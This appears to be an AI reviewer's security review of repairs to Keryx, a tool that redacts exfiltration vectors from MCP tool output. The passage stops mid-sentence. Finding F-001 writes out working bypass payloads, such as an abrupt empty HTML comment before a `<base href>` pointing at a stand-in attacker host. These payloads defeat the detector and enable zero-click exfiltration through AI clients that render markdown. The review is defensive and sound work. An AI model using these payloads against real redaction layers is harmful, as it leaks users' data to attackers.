STATUS: DONE_WITH_CONCERNS

# T62 — independent recheck of the last five repairs of this phase (T60, T61, T63, T64, T65)

**Stage 1 does not pass.** Five of the six rows reproduce as closed under probes
written fresh here and executed against the working tree. Row 6's companion —
the behaviour change the implementer explicitly flagged for a second look —
**reopens the zero-click exfiltration floor this phase spent five rounds
closing**. Six payloads that a renderer parses as a live `<base href>` are now
released **unmasked**, four of them adjudicated by an independent HTML
tokenizer and confirmed leaking at all four real public boundaries with
`redaction.state: "none"` and no reasons. Stage 2 (code quality) was therefore
not started, per the dispatch's ordering.

Three further residuals are recorded (`minor`), two of them on the row-3
question the dispatch asked me to look for ("any remaining site that decides
what that mode means and disagrees"), plus two `info`.

## Scope

- Root: `/Users/Goodea/goodea/keryx` — the main checkout only. No directory
  under `.claude/worktrees/` was entered; every path below is absolute or
  relative to that root.
- Branch: `codex/agent-first-core`. Base / merge-base with `main`:
  `0bc6418fa1a038f8ec909cf949fecba077acf9a4` (identical to HEAD — the branch
  carries uncommitted work only).
- This reviewer wrote none of the code, none of the specs, and none of the
  earlier reviews (T39, T42, T53, T57, T58, and the five implementations under
  review).
- Read-only on all production and test code. Written: this file,
  `T62-result.json`, and five probes `T62-{flow,state,mode,health,exfil,boundary}.ts`.
  Every fixture was `mkdtemp` and removed in `finally`; the only key-shaped
  string is the synthetic `AKIAIOSFODNN7EXAMPLE` the repository's own tests
  already use; every host is `*.invalid` or `example.org`. No git state, flow
  state, dependency, network or model call; no `bun test` without file
  arguments.

### File hashes (SHA-256), start and end

Full digests: `.metaproject/data/gdctx/raw/T62-hashes-start.txt`
(`95ce99f8fd1df9b9549b792cda6cae776997bb81f3fc4d3ebe2e7968a7d00877`) and
`T62-hashes-end.txt`
(`2b92b625d9e3b1cb04474e6e0d42dbbc3e9ad90e262baf698feea9329e3194ec`).

| File | Start | End | Same |
|---|---|---|---|
| `src/flow/service.ts` | `497ca8f4…58d5bf1e` | same | yes |
| `src/security/self-protect.ts` | `ed458c4b…1fb6136906` | same | yes |
| `src/security/service.ts` | `e08be640…b71b6632` | same | yes |
| `src/security/guard.ts` | `73dbecf3…780fb1c792` | same | yes |
| `src/security/config.ts` | `cde9fd7f…3e6b1c10` | same | yes |
| `src/security/types.ts` | `e306711e…34b19fc1b9af` | same | yes |
| `src/commands/security.ts` | `7e01dc0e…7915da8117f0` | same | yes |
| `src/health/service.ts` | `dfe70c76…cfbe1b0b707` | same | yes |
| `src/health/config.ts` | `1195b840…a610afbcf2c` | same | yes |
| `src/health/gate.ts` | `4d31021c…a44514faa5` | same | yes |
| `src/health/types.ts` | `2ab7d681…b93bbe6505a1` | same | yes |
| `src/security/detect/exfil.ts` | `4ec5a924…b299f5b1691` | `efe360a3…5d77250294` | **NO — drift** |

**Drift did occur, and it is disclosed rather than glossed.** The concurrent
worker the dispatch named edited `src/security/detect/exfil.ts` mid-review
(`4ec5a9244fc7b6998ebf60b5c04da957785f3b23e457eebb0ee59b299f5b1691` →
`efe360a36fad99fd6d8f0e44490cd7424f2054bfbfb6ebc7ccd5f05d77250294`); the change
moved the character-reference decoder and `renderableUrl` earlier in the file,
shifting every line number in that file by about 161. **The inert-span code
under review is unchanged in substance and every measurement is byte-identical
across the drift**: `T62-exfil.log` and `T62-boundary.log` have the same
SHA-256 before and after (`aced49a5…` / `2f98d4b8…`), and re-running
`T53-{extract,resolve,base,boundary}.ts`, `T52-base.ts`,
`T42-{exfil-attack,charrefs,boundary}.ts` and `T24-recheck2-exfil.ts` after the
drift produced byte-identical logs to the pre-drift runs in eight of nine cases
(the ninth, `T24-recheck2-exfil`, differs only in the output filename its last
line prints — the 48-case matrix itself is identical, verified row by row).
**No conclusion in this review is affected.** Line numbers cited for
`exfil.ts` are the POST-drift ones; the pre-drift equivalents are given
alongside. `bun test src/security/detect/exfil.test.ts
src/security/output-validation.test.ts src/mcp/structural-redaction.test.ts
src/security/persistence-sinks.test.ts` is 96 pass / 0 fail after the drift
(T63 recorded 87; the worker added tests).

## Summary

| Severity | Count |
|---|---|
| blocker | 1 |
| major | 0 |
| minor | 3 |
| info | 2 |

## Stage 1

| # | Item | Verdict | My probe and what it showed |
|---|---|---|---|
| 1 | A `warn` health gate is distinguishable from a genuine pass **in the persisted record and in the published comment**; a genuine pass unchanged; nothing else about which flows complete moved | **closed** | `T62-flow.ts` (raw `T62-flow.log`). Deliberately does **not** stub `healthGate`: it writes a real `.metaproject/data/health/artifacts/latest.json` and uses the production wiring copied from `src/commands/flow.ts:flowServiceDeps()` (`createCodeHealthService().gate`), so the value reaching `healthGateOutcome` is produced by the real health service. It also captures the text handed to `tracker.comment(...)` — the **published** comment — not only `result.issueComment`. R01 (real report `gate:pass`): stored history `["done: all gates passed"]`, published `…health: pass` — byte-identical to the pre-fix constant. R02 (real report `gate:warn`): stored history `["done: all gates passed (health gate: warn)"]`, published `…health gate: warn`. R99: `storedRecordsIdentical:false`, `publishedCommentsIdentical:false`, `passStoredContainsWarn:false`, `warnStoredContainsWarn:true`. The fold itself did not move: 13 health statuses through `complete()` (S01–S13) give `passed:true` for exactly `pass` and `warn` and `false` for everything else, with the shared constant `"health gate could not be evaluated; treated as failed, not skipped"` on every unrecognized value. R91 attacks the string comparison — a *security* gate whose `detail` is the literal `"health gate: pass"` does not launder the health row (`distinguishable:true`). Re-run of `T57-flow.ts` (`T62-rerun-T57-flow.log`) agrees: C99 `storedRecordsIdentical:false`, `storedRecordContainsWarnWord:true`. |
| 2 | No incident for a window in which enforcement was not weakened; a genuine downgrade across such a window still detected; **both arms**; repair to the same / a stricter / a weaker mode each produce the right record | **closed, with one residual** | `T62-state.ts` (raw `T62-state.log`), measured at `analyze()` — the real call site of `evaluateSelfProtection` and the only caller of `appendIncidents`/`writeState` — never at the pure function. **22/22 OK** on the mode matrix: 2 broken shapes (`null`; `{"mode":"ENFORCED"}` with the operator's real policies and a correct `configChecksum`) × 11 (prior mode, repair target) pairs, with incidents read **immediately after the broken run** as well as after the repair. Zero incidents and zero warnings inside every window, including `gateway` prior — T57 F-002 is closed. Repair to the **same** mode: silent. To a **stricter** one (`ci→gateway`, `enforced→gateway`, `advisory→enforced`): silent. To a **weaker** one (`gateway→ci`, `gateway→advisory`, `ci→advisory`, `enforced→advisory`): `mode-downgrade` every time. First-run-already-broken: `NO STATE FILE` after one and after three runs, no incidents, and the first readable config establishes real state (both shapes). The checksum arm, deliberately unguarded, still fires on a file whose checksum does not match its own policies (D) — a true statement about the file. Residual on the **policy** arm → **F-003**. |
| 3 | The two notions of the gateway mode agree, the blocking predicate corrected rather than the rank table; the command exit-code folds agree **at the real command entry points**; no remaining site disagrees | **closed at the folds, with two residuals** | `T62-mode.ts` (raw `T62-mode.log`). Full 4-mode × 4-surface matrix driven through `securityCommand([...], root)`, including **`check-output`, which T65's own probe did not drive**. `gateway` now exits 1 for `fail`, `needs-approval`, `incomplete` and an unrecognized stored gate at `scan`, `report`, `check-input` and `check-output`, and 0 on every pass control; `advisory` is 0 on every cell, unchanged. The stored artifact always claimed the most permissive `mode:"advisory"` it could, so a fold taking strictness from the artifact would have shown up and did not. M2 (the module seams, not the folds): under `gateway`, `guardOutput` refuses a planted `AKIA…` and `securityFlowGate` returns `fail` — no `informational` shortcut — identical to `enforced`/`ci`. `T65-verify-gateway.ts` re-run agrees (13/13). Residuals: the rank table still claims `gateway` is *strictly* stricter than `enforced`/`ci` while nothing realises that (**F-002**), and the prose surfaces still say the opposite (**F-004**). |
| 4 | The health report shape guard covers the fields its readers dereference; **all four** readers, including the one disclosed as having no dedicated regression | **closed** | `T62-health.ts` (raw `T62-health.log`), 16 stored shapes × **all four** readers — `gate()`, `status()`, `explain()` and `updateBaseline()` — the last being the reader T61 disclosed as untested, exercised here precisely because nothing else does. Every malformed shape (metrics/sources/findings absent, string, object, null, number; `__proto__` supplying the arrays; no `gate` key; whole payload `null`/unparseable) folds to the module's own answer at every reader: `gate()` the constant `{"status":"fail","exitCode":1,"reasons":["no report; run \`keryx health run\` first"]}`, `status()` its all-null defaults, `explain()` `found:false`, `updateBaseline()` a clean recompute. **Zero throws on 16 × 4 = 64 calls**, and the well-formed control (H01) still reads real data. No planted secret and no fixture path in any result. `readLatest`'s second, indirect path (a `latest.json` whose `record` points at another artifact) is exercised too (H20–H22) and fails closed. Enumeration checked independently: `readLatest` is module-local and not exported, and `bun src/cli.ts ctx rg` over `src/health/service.ts` returns exactly the four call sites at `:233`, `:256`, `:272`, `:304`. `T57-health.ts` re-run: E18/E19 `statusThrew:null`, E18's former false clean `pass` now the constant refusal. |
| 5 | An unusable health configuration produces a legible constant reason **without moving the verdict**; the coverage soft floor is no longer permissive; an absent and a well-formed configuration are unchanged | **closed** | `T62-health.ts` rows G01–G40. Loader, from disk: absent and both well-formed shapes carry `configUnreadable: undefined`, `coverageSoftFloor` 60 / the operator's 90, the default gate and `required:false` — byte-identical to before. All six unusable shapes (`null`, `42`, unparseable, `[]`, `"advisory"`, `true`) set `configUnreadable:true`, `coverageSoftFloor:100`, `failOnPriorities:[P0,P1,P2,P3]`, both drop thresholds 0, every source required. **The verdict did not move, and I can say why more precisely than T64 did**: across 9 loaded configs × 4 coverage values (absent, 41, 70, 100), the reason line never escalates *and the soft-floor forcing cannot either*, because the same branch already forces `failOnRegressionDrop: 0`, which makes `regression >= 0` unconditionally true and pins an unusable-config gate at `fail` before coverage is read (**F-006**, info). At the **real entry point** — `createCodeHealthService().run({cwd})`, whose `computeGate` call is `run.ts:152` — G30 (absent) and G31 (well-formed) are identical and carry no CONFIG reason; G32 (unusable) carries exactly one, `"CONFIG: health configuration is unreadable; gate forced to strictest thresholds"`, non-interpolated, with no fixture path. G40 tests the loader comment's claim against a value nothing validates (`coverageSoftFloor: 150`): the forced config is still at least as strict at the status level. |
| 6 | The detector's recorded arguments are true for the reasons they state, and the sufficiency argument is pinned by a test rather than only by prose | **closed** | Read of `src/security/detect/exfil.ts` (post-drift `:388-452`, the `SYNTHETIC_BASE_PAIRS` argument): the corrected paragraph now names the FILE state and the OPAQUE-PATH branch, states that neither synthetic pair realises either, and identifies `resolvedHost`'s http(s) filter — not a third pair — as the fact that closes them, with the consequence of widening it spelled out. That is exactly T53#F-002's requested correction. It is **pinned by execution, not prose**: `src/security/detect/exfil.test.ts:670` asserts that `file:///…`, `file://host/…`, `ws://`, `wss://` and `ftp://` destinations are not findings — a test that goes red the moment `resolvedHost` widens, which is the load-bearing fact. `readStartTag`'s doc comment now states both halves of the EOF rule, and `:685` pins the conservative half. `T53-resolve.ts` re-run: 41 × 15 = 615 resolutions, 0 bypasses, 0 false positives, identical to T53. |

**Stage 1 result: rows 1–6 are closed and every claim about them holds under my
own execution. Stage 1 nevertheless FAILS, on the judgement call the dispatch
attached to row 6: the inert-context suppression T63 introduced is a live
bypass of the floor, measured at four real boundaries (F-001).**

## Findings

### [F-001] The `<base href>` inert-span suppression releases attacker-controlled document bases unmasked — six shapes, four confirmed at every public boundary

- **Severity**: blocker
- **File**: `src/security/detect/exfil.ts:729` (`HTML_COMMENT_SPAN`) and `:730`
  (`FENCE_LINE`), consumed at `:942` (pre-drift `:568`/`:569`/`:745`)
- **Symbol**: `nonRenderedSpans` / `fencedCodeBlockSpans` / `isInNonRenderedSpan`
- **Attack vector**: the attacker controls text that Keryx redacts before it
  reaches a markdown-auto-rendering client — an MCP tool result, a fetched
  document, memory or wiki content, any of the four sinks T42/T53 measured.
  They write **five extra bytes** in front of an ordinary hostile base:
  `<!--><base href="https://attacker.invalid/x/">` and a bare `-->` anywhere
  later in the same payload. `<!-->` is the HTML tokenizer's
  *abrupt-closing-of-empty-comment*: the comment token ends at the `>`
  immediately after `<!--`, so the `<base>` that follows is a **live element**.
  The detector's `/<!--[\s\S]*?-->/` instead runs to the later `-->`, decides
  the tag sits inside a closed comment, and emits **no finding at all**. The
  released document re-points every relative URL in it to the attacker's host,
  so every relative image fires a zero-click GET carrying the surrounding
  path — the exact channel `egress.html-base-href-exfil` was added for.
- **Problem**: T63 added a rule suppressing a `<base href>` finding when the tag
  falls inside a span this fragment shows is CLOSED, as an HTML comment or a
  CommonMark fenced code block. Both delimiters are approximated by a regex,
  and both approximations are wrong in the direction that suppresses:
  1. **The comment half.** `HTML_COMMENT_SPAN` recognizes exactly one
     terminator, `-->`. The HTML tokenizer has three more: `<!-->` and `<!--->`
     close in the comment-start / comment-start-dash states
     (abrupt-closing-of-empty-comment), and `--!>` closes in the
     comment-end-bang state. Each of them ends the comment **before** the
     attacker's `<base>`, while the regex swallows it.
  2. **The fence half.** `fencedCodeBlockSpans` pairs fence-marker lines
     left to right with no awareness of any other block context, and
     `nonRenderedSpans` computes fence spans and comment spans **independently
     of each other**. So a fence marker quoted inside a comment, or a comment
     delimiter quoted inside a fence, opens a span the renderer does not have.
     `<!--\n` ``` `\n-->\n\n<base href=…>\n\n` ``` `\n` is inert to nothing:
     the comment ends at line 3 and the base on line 5 is live under *both*
     renderer models, while the two literal fence lines (2 and 7) pair into a
     "code block" that covers it.
  The bound T63 relies on — "only a span whose opening AND closing delimiter
  are both present counts" — is not the property that makes suppression safe.
  Presence of a matching pair of *this code's* delimiters is not evidence that
  a renderer draws the span between them, and every case above supplies such a
  pair.
- **Impact**: AC5 (AFC-15) and the dispatch's own "no new bypass" criterion
  fail. This is a complete release, not a partial one: at `dispatchCallTool`,
  `prepareOutputForPersistence`, `validateOutputForTransport` and
  `redactToolOutput`, all four report `redaction.state: "none"` with an empty
  `reasons` array and the attacker host present in the released bytes — the
  caller is not even told anything was considered. A masked `<base href>` was
  measured by T53 to neutralise 15 of 15 hostile vectors; these payloads restore
  all of that reach for five bytes. The blast radius is the one T53#F-001
  documented: not one image, the document's entire relative resolution.
- **Reproduction**:
  `bun .metaproject/flows/233-2026-09-06-agent-first-core-phase-1/artifacts/T62-boundary.ts`
  (raw `.metaproject/data/gdctx/raw/T62-boundary.log`, sha256
  `2f98d4b84b11f671e490464e5ccf08c7dfd515914a2deb9e2aa0b114655dcf32`), advisory
  redaction OFF so what is measured is the mandatory floor:
  ```
  {"label":"SUMMARY","hostileLeakingAtAnyBoundary":4,
   "ids":["abruptEmptyComment","abruptDashComment","commentEndBang",
          "fencePairSwallowsLiveBase"]}
  ```
  Each of the four: `mcpState "none"`, `mcpReasons []`, `persistState "none"`,
  `transportState "none"`, `leaksHost {mcp:true,persist:true,transport:true,seam:true}`.
  Controls in the same run: `plainHostileBase` and `unterminatedComment` are
  both `redacted` with `["egress.html-base-href-exfil"]` and leak nothing, and
  T63's two benign suppression targets stay byte-identical.
  `bun …/T62-exfil.ts` (raw `T62-exfil.log`, sha256
  `aced49a50b17d7b225b61567d98cf811f8a34789bd042c800599e2095fdbed2a`) adjudicates
  the renderer question against **Bun's `HTMLRewriter` (lol-html)**, an
  independent, spec-derived HTML tokenizer with no relationship to this
  codebase: `x01`, `x02`, `x03` and `x07` all report
  `lolHtmlLiveBaseHref: "https://attacker.invalid/x/"` with `baseFindings: 0`.
  Two further shapes (`x05`, `x06`) are bypasses under the markdown model this
  file's own header commits to and are marked as CommonMark-adjudicated rather
  than tokenizer-adjudicated. Summary: `{"cases":13,"bypasses":6}`, with
  `c01`–`c05` and `x04`, `x08` as controls that all behave correctly.
- **Suggested fix**: **revert the suppression** and restore T53's standing
  ruling — keep the class, keep the empty-allowlist default, document the blast
  radius (which T63 did well and independently, at `:936-941` and in
  `BASE_REMEDIATION`; that half should stay). Reverting only
  `fencedCodeBlockSpans`, the isolation T63 offered, is **not sufficient**: it
  removes `x07` but leaves `x01`, `x02` and `x03`, three of the four
  boundary-confirmed leaks, all in the HTML-comment half T63 described as
  "unconditionally inert under every renderer model". Reverting only the comment
  half leaves `x07`. Neither half is independently sound. If suppression is
  wanted later, it must come from a real tokenizer/CommonMark pass over the
  fragment (the same discipline `readStartTag` already applies to attributes),
  and it must fail toward flagging on every ambiguity, not only on an
  unterminated delimiter — the direction that releases attacker bytes is the one
  that needs the proof.
- **class_scope**:
  - sites: `src/security/detect/exfil.ts:729` (`HTML_COMMENT_SPAN` — three
    missing terminators); `src/security/detect/exfil.ts:730` (`FENCE_LINE`);
    `src/security/detect/exfil.ts:736` (`fencedCodeBlockSpans` — context-free
    pairing); `src/security/detect/exfil.ts:763` (`nonRenderedSpans` — computes
    the two span kinds independently of each other); `src/security/detect/exfil.ts:773`
    (`isInNonRenderedSpan`); `src/security/detect/exfil.ts:942` (the only
    consumer, the `tag === "base"` branch). Pre-drift line numbers: `:568`,
    `:569`, `:575`, `:602`, `:612`, `:745`.
  - enumeration_method: `bun src/cli.ts ctx rg -n
    "fencedCodeBlockSpans|nonRenderedSpans|isInNonRenderedSpan|getNonRenderedBaseSpans|HTML_COMMENT_SPAN|FENCE_LINE"
    src/security/detect/exfil.ts` (raw `2026-09-06T17-11-01-582Z_rg.log`
    pre-drift, `2026-09-06T17-27-43-994Z_rg.log` post-drift) enumerated every
    site of the new mechanism — 6 definitions and 1 consumer, all read in full.
    The bypass set was then derived from the HTML Standard's comment states
    (comment-start, comment-start-dash, comment-end-bang, comment-end) and
    CommonMark's fenced-code and HTML-block rules, one payload per state, each
    adjudicated by lol-html where the pure-HTML tokenizer decides and by the
    named CommonMark rule where markdown decides, then driven through all four
    real boundaries rather than through `detectExfil` alone.
- **Confidence**: high (executed end to end at four public boundaries; the
  renderer question answered by a second implementation, not by my reading of
  the standard).

### [F-002] `MODE_RANK` still ranks `gateway` strictly above `enforced`/`ci` while every observable behaviour is now identical, so `gateway → enforced` writes a durable "enforcement weakened" incident for a change that weakens nothing

- **Severity**: minor
- **File**: `src/security/self-protect.ts:39-44` (`MODE_RANK`), consumed at
  `:108-118`
- **Symbol**: `MODE_RANK` / `evaluateSelfProtection`
- **Problem**: T61 resolved the disagreement in the blocking direction, and that
  half is right and verified. What it did not resolve is the **ordering**. After
  T61 and T65, `gateway` is behaviourally **identical** to `enforced` and `ci` at
  every site in the repository that branches on the mode — `isBlockingMode`
  (`guard.ts:237`), `reportExitCode` (`commands/security.ts:683`), `exitCodeFor`
  (`:972`) — and my matrix confirms it cell for cell at four command surfaces
  and both module seams. `MODE_RANK` nevertheless gives `gateway` 3 and
  `enforced`/`ci` 2, so a reconfiguration from `gateway` to `enforced` appends
  a durable `mode-downgrade` entry to the append-only `incidents.jsonl` with the
  message *"Mode changed from gateway to enforced"* and the warning *"…
  (enforcement weakened)"*. Nothing was weakened. This is the same shape as
  T57 F-002 — a durable record asserting something that did not happen — moved
  onto the readable-config path, which T61's `!config.configUnreadable` guard by
  construction does not cover. T61's cited reason for keeping the table fixed
  ("what must keep passing pins the direction") is circular in one respect worth
  naming: the regressions it defers to (`T58 D2`, and `T61 D1` which T61 wrote
  itself) were authored under the ranking they are cited to justify, and T61
  corrected exactly such a committed expectation on the other axis
  (`guard.test.ts`'s `{mode:"gateway", blocks:false}` row).
- **Impact**: fail-loud noise in the audit trail, not a bypass — no check is
  relabeled and nothing is let through. Recorded because a false entry in the
  append-only trail erodes the signal a real `mode-downgrade` carries, and
  because it is the residual of the exact question the dispatch asked me to
  chase. Reachability is low: `gateway` is documented as unimplemented (see
  F-004) and is unlikely to be set today.
- **Reproduction**: `bun …/T62-mode.ts`, raw
  `.metaproject/data/gdctx/raw/T62-mode.log` (sha256
  `81c0e7046acc951880a9f0f5be3362b7f02e95f9bc22771caf3f960c28191ca8`). M3 drives
  every ordered pair of recognized modes through the real `analyze()` and reads
  `incidents.jsonl` back: `{"from":"gateway","to":"enforced","downgradeDetected":true}`
  and `{"from":"gateway","to":"ci","downgradeDetected":true}`, while M2 in the
  same run shows `gateway`, `ci` and `enforced` produce identical
  `guardAllowed:false` / `flowGateStatus:"fail"`, and M1 shows identical exit
  codes at `scan`, `report`, `check-input` and `check-output` across all
  11 gate/surface cells.
- **Suggested fix**: rank `gateway` at 2, alongside `enforced` and `ci`, for as
  long as it has no behaviour of its own. `gateway → advisory` stays a
  downgrade (the only one that is true today) and `advisory → gateway` stays
  silent; `T58 D2`'s `gateway → ci` pin then encodes a claim the code no longer
  makes and should be corrected in writing, the way T61 corrected
  `guard.test.ts`'s row. If the ranking is deliberately forward-looking for
  Phase 4, keep it and change the wording instead — an incident and a warning
  that assert "enforcement weakened" must not fire for a transition that
  weakens nothing.
- **Confidence**: high (executed; the incident file was read back for all 12
  ordered pairs, and the blocking behaviour measured at four command surfaces
  and two seams in the same run).

### [F-003] The new guard on the disabled-policy arm suppresses a TRUE §14 signal, and the reason recorded for it is false for one of the two broken shapes

- **Severity**: minor
- **File**: `src/security/self-protect.ts:120-135` (the disabled-policy arm and
  its comment)
- **Symbol**: `evaluateSelfProtection`
- **Problem**: T61 extended T58's `!config.configUnreadable` guard from the
  mode arm to the disabled-policy arm, on the stated ground that *"a
  forced/derived config's policies (defaults, for a fully-unusable payload) are
  not an operator's choice either"*. That is true for one of the two broken
  shapes and false for the other. For an **unusable payload** the config's
  policies are the built-in defaults (all enabled), so no `policy-disabled`
  comparison could fire in the first place and the guard is a no-op — measured
  (B3). For an **unrecognized mode**, `loadSecurityConfig` returns
  `{...merged, mode:"enforced", configUnreadable:true}`, and `merged` carries
  the operator's **real, parsed policies**: the comment's own words, *"the rest
  of that config is kept — it parsed fine, and the operator's own `policies` …
  are still theirs"* (`config.ts:228-233`). So a policy the operator genuinely
  disabled in that same file produces no warning and no incident, even though
  the statement would have been true of their own bytes. §14's stated
  invariant — *"a mode downgrade or a disabled policy is always surfaced (warn
  + incident)"* (`self-protect.ts:14-18`) — is silent for the window, and
  silent forever if the mode typo is never repaired.
- **Impact**: not a bypass and not a false record — an omission, not an
  assertion, so AC8 is not violated. Enforcement during the window is
  maximally strict (`guardOutput` and `securityFlowGate` refuse everything
  through their posture-unavailable branches), so the disabled policy buys
  nothing while it lasts, and detection resumes the moment the config is
  readable again. The cost is that a self-protection control which promises to
  always surface an operator's change can be silenced by a four-byte edit to a
  neighbouring field, and that the reason written next to the guard is not the
  reason it is safe.
- **Reproduction**: `bun …/T62-state.ts`, raw
  `.metaproject/data/gdctx/raw/T62-state.log` (sha256
  `d573be65110b7f2af9ab6256b006a9c2f3d45909ccc167d4d42f52e06325bce4`):
  ```
  B0 control: readable config, promptInjection disabled
     incidents ["policy-disabled"], warnings ["security policy \"promptInjection\" was disabled."]
  B1 broken mode + REAL policy disable in the same file
     incidentsDuringWindow [], warningsDuringWindow []
     trueDisableSuppressedDuringWindow true, detectedOnceRepaired true
  B2 broken mode + REAL policy disable, never repaired (3 runs)
     incidents [], realDisableEverRecorded false
  B3 unusable payload after a config that already disabled egress
     incidentsDuringWindow []   (the guard is a no-op for this shape)
  ```
- **Suggested fix**: narrow the guard to the shape it was argued for. The
  loader already distinguishes the two: an unusable payload yields
  `mergeSecurityConfig({})` (derived policies), an unrecognized mode yields
  `{...merged, …}` (real policies). Carrying that distinction — a second flag,
  or comparing `config.policies` against the defaults — lets the policy arm keep
  running for the unrecognized-mode shape while staying silent for the derived
  one. At minimum, correct the comment: for the unrecognized-mode shape the
  policies **are** the operator's choice, and the arm is guarded for
  convenience, not because the statement would be untrue.
- **Confidence**: high (executed at `analyze()`, with the incident file read
  back during the window and after the repair).

### [F-004] The prose that classifies `gateway` was not updated with the code, and one operator-facing sentence is now affirmatively false

- **Severity**: minor
- **File**: `docs/docs/cli-reference.md:2096`, with `src/security/templates.ts:62-64`
  and `:124`
- **Symbol**: the `security` module documentation
- **Problem**: `docs/docs/cli-reference.md:2096` states *"Model/API backends and
  gateway mode (Phase 4) are not implemented."* After T61 and T65, `gateway` is
  a fully enforcing posture: it blocks the write seam, fails flow completion,
  and exits non-zero at `security scan`, `report`, `check-input` and
  `check-output`. Around it, every prose enumeration of which modes block still
  reads "advisory … enforced/ci block" and omits `gateway` —
  `src/security/templates.ts:62-64` and `:124`, which are **written into the
  operator's own project** by `keryx init`/`update` as agent-facing rules, plus
  `.metaproject/modules/security.md:48`, `docs/docs/architecture.md:547,563`,
  `docs/docs/modules.md:865,874,881`, `docs/docs/workspace-and-lifecycle.md:339,350`
  and `docs/docs/cli-reference.md:330,754,912,993,1058`. T65's own enumeration
  covered `src/commands/security.ts` exhaustively and correctly; it did not look
  outside that file, and the residual is not disclosed in T61 or T65.
- **Impact**: an operator reading the reference would believe setting
  `mode: "gateway"` is inert and get the strictest posture the tool has —
  blocked writes, a failing flow gate, and non-zero exits at four commands. The
  reverse mistake is worse: `templates.ts`'s text is the guidance an agent reads
  in the target project, and it tells that agent `gateway` is not one of the
  modes that refuse.
- **Reproduction**: `bun src/cli.ts ctx rg -n '"gateway"' src` (raw
  `2026-09-06T17-09-14-745Z_rg.log`) — 6 production sites, all now blocking;
  `bun src/cli.ts ctx rg -n 'enforced.*ci|advisory.*enforced' docs
  .metaproject/modules src/security/templates.ts` (raw
  `2026-09-06T17-17-18-491Z_rg.log`) — the enumeration above. Behaviour measured
  in `T62-mode.log` M1/M2.
- **Suggested fix**: correct `cli-reference.md:2096` (gateway mode's *blocking*
  behaviour is implemented; only its Phase-4 proxy behaviour is not) and add
  `gateway` to the "enforced/ci block" enumerations, `src/security/templates.ts`
  first because it ships into user projects.
- **Confidence**: high.

### [F-005] Health source errors interpolate raw caught text into gate reasons, which reach a committable artifact and the flow's durable record

- **Severity**: info
- **File**: `src/health/run.ts:240`, `:275`, `:297`
- **Symbol**: `SourceRunInfo.error` → `computeGate` (`gate.ts:78-79`) →
  `HealthReport.gate.reasons`
- **Problem**: three sites build a source's `error` as
  `` `source detection failed: ${error instanceof Error ? error.message : String(error)}` ``
  and siblings. `computeGate` interpolates that into
  `` `INCOMPLETE: required source unavailable: ${source.source}${detail}` ``,
  which is persisted into `.metaproject/data/health/artifacts/latest.json` (a
  committable artifact) and, through `healthGateOutcome`'s `incomplete`/`fail`
  arms, into `flow.json`'s `completion-failed` history entry. A caught
  `error.message` from a spawned tool or a file read routinely carries an
  absolute path. This sits directly beside the constant, non-interpolated
  `CONFIG_UNREADABLE_REASON` T64 added, which is exactly right; its neighbours
  in the same array are not held to the same bar.
- **Impact**: none demonstrated — I could not produce a payload that put a path
  into a reason in a synthetic fixture (the two errors I reached,
  `"dependency audit JSON parse failed"` and the absent-source case, are fixed
  phrases), so this is `info` under the shared iron law rather than a finding
  with a reproduction. Recorded because the whole phase turns on durable records
  carrying only constant, leak-safe reasons, and this is the one path into those
  records that is not constant. Pre-existing; introduced by none of the five
  repairs.
- **Reproduction**: `bun …/T62-health.ts` row `G32` (raw `T62-health.log`) shows
  a source `error` reaching a gate reason at the real entry point; `bun
  …/T62-flow.ts` rows `S03`/`S04` show the health module's reasons reaching
  `flow.json` history verbatim (`leakedSecret: true` for a planted string placed
  in `reasons`). `bun src/cli.ts ctx rg -n 'error: ' src/health/sources
  src/health/run.ts src/health/service.ts` (raw
  `2026-09-06T17-22-00-830Z_rg.log`) enumerates the three interpolating sites
  against nine constant ones.
- **Suggested fix**: give the three `run.ts` sites a constant category the way
  `dependency-audit.ts` and `eslint.ts` already do, or strip `source.error` from
  the reason and keep it in a field the gate does not serialise into
  `reasons`. Track separately — it is outside every row of this dispatch.
- **Confidence**: medium (the path is read and the two hops are measured; no
  payload that actually carries a filesystem path was constructed).

### [F-006] Forcing `coverageSoftFloor` to 100 cannot move a verdict, because the same branch already pins the gate at `fail`

- **Severity**: info
- **File**: `src/health/config.ts:146`
- **Symbol**: `loadHealthConfig` (the "present, unusable" branch)
- **Problem**: T64 §5 argues that leaving `metrics.coverageSoftFloor` at the
  default *"reopened the exact bug T59 closed, narrowed to this one field"*,
  because an operator who tightened it to 90 would have that tightening
  silently reverted to 60. The premise about the field is right; the conclusion
  about the consequence is not reachable. The same branch forces
  `gate.failOnRegressionDrop: 0`, and `computeGate` escalates on
  `regression >= config.gate.failOnRegressionDrop` with `regression` defaulting
  to 0 — so an unusable config produces `FAIL: health regression 0 vs baseline`
  unconditionally, before coverage is read, and the gate is already `fail`. The
  soft-floor forcing therefore adds a `WARN:` line to `reasons` and can never
  change `status`.
- **Impact**: none. The change is correct in direction and harmless; the
  argument recorded for it overstates what it buys, which is the failure mode
  this phase has flagged repeatedly (a sound rule with an unsound stated
  reason). It also means T64's acceptance row "the verdicts themselves are
  unchanged" is true for a reason T64 does not give.
- **Reproduction**: `bun …/T62-health.ts` rows `G20` (raw `T62-health.log`):
  every unusable config × every coverage value (absent, 41, 70, 100) yields
  `"status":"fail"` with `"FAIL: health regression 0 vs baseline"` always
  present; the soft-floor line appears at coverage 41 and 70 and is absent at
  100 and when coverage is absent, with `status` identical in all four.
- **Suggested fix**: state in the branch's comment that the forcing is defence
  in depth against a future change to `failOnRegressionDrop`, not a
  currently-reachable verdict change. Optionally note that nothing validates
  `coverageSoftFloor`, so the "every legal value is <= 100" claim rests on
  convention (G40 shows a config declaring 150 is accepted; the forced config is
  still at least as strict at the status level, for the same reason above).
- **Confidence**: high (executed, 36 config × coverage combinations).

## Judgement calls

### The `<base>` inert-context suppression — **the change is NOT right as
implemented; it must be reverted, and the isolation offered is not sufficient**

T63 asked for a second look on three questions. All three are answered by
measurement, not by preference.

***Is the change right?* No.** The *motivation* is sound and I would not
dismiss it: T53#F-001 established that a false `<base>` positive is a
whole-document effect, categorically worse than the one-image cost of a false
`<img>` positive, and that documentation *about* `<base>` is the benign shape
most likely to trip it. Reducing that specific false positive is a legitimate
goal, and the rest of T63's response to F-001 — the asymmetry stated in the
branch comment, and `BASE_REMEDIATION` naming the whole-document consequence in
the finding itself rather than only in a comment — is exactly what T53 asked
for and should stay.

The *implementation* is not right, and the reason is structural rather than a
missed case. The rule decides that a renderer will not parse a span as markup,
using two regexes that approximate two different grammars (the HTML comment
states, and CommonMark's fenced-code and HTML-block rules) — in the one
direction where being wrong releases attacker-controlled bytes. Every other
